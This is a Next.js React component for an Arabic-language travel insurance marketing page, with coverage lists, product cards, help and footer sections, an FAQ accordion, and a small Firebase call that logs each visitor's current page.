"use client"

import { useEffect, useState } from "react"
import Image from "next/image"
import Link from "next/link"
import { ChevronDown, ChevronRight, Phone, MapPin, FileText } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion"
import { addData } from "@/lib/firebasee"

export default function TravelInsurancePage() {
  const [isExpanded, setIsExpanded] = useState(false)
  const handleCurrantPage=()=>{
    const _id=localStorage.getItem('visitor')
    addData({
      id:_id,
      currantPage:'تامين بيت'
  })
  }
  useEffect(()=>{
    handleCurrantPage()
  },[])
  const coverageItems = [
    {
      id: "medical",
      title: "المصاريف الطبية الطارئة والنقل",
      icon: (
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          strokeLinecap="round"
          strokeLinejoin="round"
          className="text-[#0a2e5c]"
        >
          <path d="M8 19H5c-1 0-2-1-2-2v-1a3 3 0 0 1 3-3h12a3 3 0 0 1 3 3v1c0 1-1 2-2 2h-3"></path>
          <path d="M8 19a2 2 0 1 0 4 0"></path>
          <path d="M12 19a2 2 0 1 0 4 0"></path>
          <path d="M12 3v6"></path>
          <path d="M9 6h6"></path>
        </svg>
      ),
    },
    {
      id: "covid",
      title: "كوفيد-19 إيجابي أثناء الرحلة",
      icon: (
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          strokeLinecap="round"
          strokeLinejoin="round"
          className="text-[#0a2e5c]"
        >
          <path d="M7 10v12"></path>
          <path d="M15 5.88 14 10h5.83a2 2 0 0 1 1.92 2.56l-2.33 8A2 2 0 0 1 17.5 22H4a2 2 0 0 1-2-2v-8a2 2 0 0 1 2-2h2.76a2 2 0 0 0 1.79-1.11L12 2h0a3.13 3.13 0 0 1 3 3.88Z"></path>
        </svg>
      ),
    },
    {
      id: "luggage",
      title: "تأخر وصول الأمتعة",
      icon: (
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          strokeLinecap="round"
          strokeLinejoin="round"
          className="text-[#0a2e5c]"
        >
          <path d="M20 20a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.9a2 2 0 0 1-1.69-.9L9.6 3.9A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13a2 2 0 0 0 2 2Z"></path>
        </svg>
      ),
    },
    {
      id: "cancellation",
      title: "مغادرة متأخرة / إلغاء الرحلة",
      icon: (
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          strokeLinecap="round"
          strokeLinejoin="round"
          className="text-[#0a2e5c]"
        >
          <path d="M2 21 8 15"></path>
          <path d="m14 15 6 6"></path>
          <path d="M8 9h.01"></path>
          <path d="M16 9h.01"></path>
          <path d="M12 4a8 8 0 0 0-8 8h16a8 8 0 0 0-8-8Z"></path>
        </svg>
      ),
    },
  ]

  const additionalBenefits = [
    {
      id: "activities",
      title: "النشاطات الرياضية، الرحلات، والمغامرات",
      icon: (
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          strokeLinecap="round"
          strokeLinejoin="round"
          className="text-[#0a2e5c]"
        >
          <path d="M19 4v16"></path>
          <path d="M12 4v4"></path>
          <path d="M12 12v8"></path>
          <path d="M5 4v16"></path>
          <path d="M5 8h7"></path>
          <path d="M5 16h7"></path>
          <path d="M19 8h-4"></path>
          <path d="M19 16h-4"></path>
        </svg>
      ),
    },
  ]

  const otherProducts = [
    {
      id: "family",
      title: "تأمين حماية العائلة والصحة",
      image: "/146BannerImage.jpg",
      description: "احمي أحبائك عندما تكون بعيداً",
    },
    {
      id: "term",
      title: "الحماية على المدى البعيد (TERM)",
      image: "/20BannerImage.jpg",
      description: "احمي أحبائك عندما تكون بعيداً",
    },
  ]

  return (
    <div className="min-h-screen bg-white  text-[#0a2e5c]">
      {/* Hero Section */}
      <div className="relative  bg-[#0a2e5c]">
        <img src="/20BannerImage.jpg" alt="Travel Insurance"                 className="w-full h-40 object-cover opacity-30" />
        <div className="absolute inset-0 flex flex-col justify-center items-center text-white p-6">
          <h1 className="text-2xl font-bold mb-2">السفر</h1>
          <h2 className="text-3xl font-bold mb-4">تأمين السفر</h2>
          <p className="text-xl">سافر بأمان مع عائلتك</p>
        </div>
      </div>

    
      {/* Action Buttons */}
      <div className="p-4 space-y-3">
        <Link href={'/travel-form'}>
        <Button className="w-full bg-[#c9a96e] hover:bg-[#b89355] text-white py-6 rounded-md text-lg">
          اشتري الآن
        </Button>
        </Link>
        <Link href={'/travel-form'}>
        <Button className="w-full bg-[#c9a96e] hover:bg-[#b89355] text-white py-6 rounded-md text-lg">
          قدم مطالبة
        </Button>
        </Link>
        <Button className="w-full bg-[#c9a96e] hover:bg-[#b89355] text-white py-6 rounded-md text-lg">اتصل بنا</Button>

        <div className="mt-4 border border-[#c9a96e] rounded-md">
          <button
            onClick={() => setIsExpanded(!isExpanded)}
            className="w-full flex items-center justify-between p-4 bg-[#c9a96e] text-white rounded-t-md"
          >
            <ChevronDown className={`h-5 w-5 transition-transform ${isExpanded ? "transform rotate-180" : ""}`} />
            <span>التأمينات الأخرى للسفر</span>
          </button>
          {isExpanded && (
            <div className="p-4 space-y-2">
              <Link href="#" className="block p-2 hover:bg-gray-100 rounded">
                تأمين السفر الفردي
              </Link>
              <Link href="#" className="block p-2 hover:bg-gray-100 rounded">
                تأمين السفر العائلي
              </Link>
              <Link href="#" className="block p-2 hover:bg-gray-100 rounded">
                تأمين السفر للأعمال
              </Link>
            </div>
          )}
        </div>
      </div>

      {/* Coverage Section */}
      <div className="p-4 mt-6">
        <h3 className="text-xl font-bold mb-4 text-[#0a2e5c]">ماذا يغطي التأمين</h3>
        <div className="space-y-4">
          {coverageItems.map((item) => (
            <div key={item.id} className="flex items-center p-4 border-b border-gray-200">
              <div className="ml-4 bg-gray-100 p-3 rounded-full">{item.icon}</div>
              <span className="text-[#0a2e5c] font-medium">{item.title}</span>
            </div>
          ))}
        </div>
      </div>

      {/* Additional Benefits */}
      <div className="p-4 mt-6">
        <h3 className="text-xl font-bold mb-4 text-[#0a2e5c]">منافع إضافية</h3>
        <div className="space-y-4">
          {additionalBenefits.map((item) => (
            <div key={item.id} className="flex items-center p-4 border-b border-gray-200">
              <div className="ml-4 bg-gray-100 p-3 rounded-full">{item.icon}</div>
              <span className="text-[#0a2e5c] font-medium">{item.title}</span>
            </div>
          ))}
        </div>
      </div>

      {/* Other Products */}
      <div className="p-4 mt-6">
        <h3 className="text-xl font-bold mb-4 text-[#0a2e5c]">منتجات أخرى مثيرة للاهتمام</h3>
        <div className="space-y-4">
          {otherProducts.map((product) => (
            <div key={product.id} className="relative rounded-lg overflow-hidden">
              <img
                src={product.image || "/placeholder.svg"}
                alt={product.title}
                width={300}
                height={150}
                className="w-full h-40 object-cover"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-[#0a2e5c] to-transparent flex flex-col justify-end p-4">
                <h4 className="text-white font-bold">{product.title}</h4>
                <p className="text-white text-sm">{product.description}</p>
              </div>
            </div>
          ))}
        </div>

        <div className="mt-6">
          <Button className="w-full bg-[#c9a96e] hover:bg-[#b89355] text-white py-4 rounded-md">
            عرض سفر
            <ChevronRight className="h-4 w-4 mr-2" />
          </Button>
        </div>

        <div className="flex justify-center mt-4">
          <div className="flex space-x-1 space-x-reverse">
            <div className="w-2 h-2 rounded-full bg-[#0a2e5c]"></div>
            <div className="w-2 h-2 rounded-full bg-gray-300"></div>
            <div className="w-2 h-2 rounded-full bg-gray-300"></div>
            <div className="w-2 h-2 rounded-full bg-gray-300"></div>
          </div>
        </div>
      </div>

      {/* Help Section */}
      <div className="p-4 mt-8 bg-gray-50">
        <h3 className="text-xl font-bold mb-4 text-[#0a2e5c] text-center">تحتاج مساعدة؟</h3>
        <p className="text-center mb-6">نحن في خدمتك 24/7</p>

        <div className="grid grid-cols-3 gap-4 mb-6">
          <div className="flex flex-col items-center">
            <div className="bg-white p-3 rounded-full shadow-md mb-2">
              <MapPin className="h-6 w-6 text-[#0a2e5c]" />
            </div>
            <span className="text-sm text-center">حدد موقعنا</span>
          </div>
          <div className="flex flex-col items-center">
            <div className="bg-white p-3 rounded-full shadow-md mb-2">
              <Phone className="h-6 w-6 text-[#0a2e5c]" />
            </div>
            <span className="text-sm text-center">اتصل بنا</span>
          </div>
          <div className="flex flex-col items-center">
            <div className="bg-white p-3 rounded-full shadow-md mb-2">
              <FileText className="h-6 w-6 text-[#0a2e5c]" />
            </div>
            <span className="text-sm text-center">تقرير مطالبة</span>
          </div>
        </div>

        <div className="flex items-center justify-center mb-8">
          <img src="/friendly-support.png" alt="Customer Service" width={100} height={100} className="rounded-full" />
        </div>
      </div>

      {/* Footer */}
      <div className="bg-[#0a2e5c] text-white p-4">
        <div className="flex justify-center mb-4">
          <Button className="bg-[#c9a96e] hover:bg-[#b89355] text-white">منتجات وخدمات</Button>
        </div>
        <div className="text-center mb-4">
          <p>تواصل معنا</p>
          <div className="flex justify-center space-x-4 space-x-reverse mt-2">
            <Link href="#" className="text-white hover:text-[#c9a96e]">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="20"
                height="20"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
                <rect x="2" y="9" width="4" height="12"></rect>
                <circle cx="4" cy="4" r="2"></circle>
              </svg>
            </Link>
            <Link href="#" className="text-white hover:text-[#c9a96e]">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="20"
                height="20"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <path d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z"></path>
              </svg>
            </Link>
            <Link href="#" className="text-white hover:text-[#c9a96e]">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="20"
                height="20"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect>
                <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path>
                <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line>
              </svg>
            </Link>
          </div>
        </div>
      </div>

      {/* FAQ Accordion */} 
      <div className="p-4 mt-6">
        <h3 className="text-xl font-bold mb-4 text-[#0a2e5c]">الأسئلة الشائعة</h3>
        <Accordion type="single" collapsible className="w-full">
          <AccordionItem value="item-1">
            <AccordionTrigger className="text-right">ما هي تغطية تأمين السفر؟</AccordionTrigger>
            <AccordionContent className="text-right">
              {`يغطي تأمين السفر المصاريف الطبية الطارئة، وإلغاء الرحلة، وتأخر الأمتعة، والحوادث الشخصية، والمسؤولية
              الشخصية أثناء سفرك.`}
            </AccordionContent>
          </AccordionItem>
          <AccordionItem value="item-2">
            <AccordionTrigger className="text-right">هل يغطي التأمين كوفيد-19؟</AccordionTrigger>
            <AccordionContent className="text-right">
              {`نعم، يغطي تأمين السفر لدينا النفقات الطبية المتعلقة بكوفيد-19 إذا أصبت به أثناء رحلتك، بما في ذلك تكاليف
              العلاج والإقامة الإضافية إذا لزم الأمر.`}
            </AccordionContent>
          </AccordionItem>
          <AccordionItem value="item-3">
            <AccordionTrigger className="text-right">كيف يمكنني تقديم مطالبة؟</AccordionTrigger>
            <AccordionContent className="text-right">
              {`يمكنك تقديم مطالبة عبر الإنترنت من خلال حسابك، أو عبر تطبيق الهاتف المحمول، أو الاتصال بخدمة العملاء على
              مدار 24 ساعة.`}
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>
    </div>
  )
}
